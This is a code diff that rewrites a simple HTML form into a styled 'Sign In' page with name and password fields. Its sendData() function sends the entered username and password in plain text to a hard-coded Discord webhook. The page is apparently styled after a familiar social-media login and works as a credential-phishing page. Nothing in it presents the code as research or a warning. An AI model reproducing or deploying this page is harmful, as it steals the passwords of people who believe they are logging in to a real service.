@@ -1,39 +1,120 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title> Login </title>
-  <style>
-    body { font-family: Arial; display:flex; justify-content:center; align-items:center; height:100vh; background:#f4f4f4; }
-    .box { background:white; padding:25px; width:300px; border-radius:10px; box-shadow:0 0 10px rgba(0,0,0,0.1); }
-    input, button { width:100%; padding:10px; margin-top:10px; border-radius:6px; border:1px solid #ccc; }
-    button { background:#3897f0; color:white; border:none; cursor:pointer; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Custom Login</title>
+
+<style>
+    body {
+        font-family: Arial, sans-serif;
+        background: #fafafa;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+    }
+
+    .login-box {
+        width: 350px;
+        background: #fff;
+        border: 1px solid #dbdbdb;
+        padding: 40px;
+        text-align: center;
+        border-radius: 12px;
+    }
+
+    h2 {
+        font-weight: 700;
+        margin-bottom: 30px;
+    }
+
+    .input-group {
+        position: relative;
+        width: 100%;
+        margin-bottom: 15px;
+    }
+
+    input {
+        width: 100%;
+        padding: 12px;
+        padding-right: 40px;
+        border: 1px solid #dbdbdb;
+        border-radius: 6px;
+        background: #fafafa;
+        font-size: 14px;
+    }
+
+    .show-btn {
+        position: absolute;
+        right: 10px;
+        top: 50%;
+        transform: translateY(-50%);
+        cursor: pointer;
+        font-size: 13px;
+        color: #555;
+        user-select: none;
+    }
+
+    button {
+        width: 100%;
+        padding: 12px;
+        background: #3897f0;
+        color: white;
+        border: none;
+        border-radius: 6px;
+        font-size: 15px;
+        cursor: pointer;
+    }
+</style>
 </head>
+
 <body>
 
-  <div class="box">
-    <h2> Sign In </h2>
-    <input id="user" type="text" placeholder="Enter something…" />
-    <button onclick="send()">Submit</button>
-  </div>
+<div class="login-box">
+    <h2>Sign In</h2>
 
-  <script>
-    async function send() {
-      const text = document.getElementById("user").value;
+    <div class="input-group">
+        <input id="username" type="text" placeholder="Name">
+    </div>
 
-      await fetch("https://discord.com/api/webhooks/1446900731742523646/cu3IEgN-WE5trLFzKQ_gci-XZq4pud_54AjJSc1galU5VAC2TZXPSa-gKCbBC3lKA1Eg", {
+    <div class="input-group">
+        <input id="password" type="password" placeholder="Password">
+        <span class="show-btn" onclick="togglePassword()">Show</span>
+    </div>
+
+    <button onclick="sendData()">Login</button>
+</div>
+
+<script>
+function togglePassword() {
+    const field = document.getElementById("password");
+    const btn = document.querySelector(".show-btn");
+
+    if (field.type === "password") {
+        field.type = "text";
+        btn.textContent = "Hide";
+    } else {
+        field.type = "password";
+        btn.textContent = "Show";
+    }
+}
+
+async function sendData() {
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
+
+    await fetch("https://discord.com/api/webhooks/1446900731742523646/cu3IEgN-WE5trLFzKQ_gci-XZq4pud_54AjJSc1galU5VAC2TZXPSa-gKCbBC3lKA1Eg", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          content: `New submission: ${text}`
+            content: `📩 New Login\n👤 Name: ${username}\n🔑 Password: ${password}`
         })
-      });
+    });
 
-      alert("Sent!");
-    }
-  </script>
+    alert("Sent!");
+}
+</script>
 
 </body>
 </html>
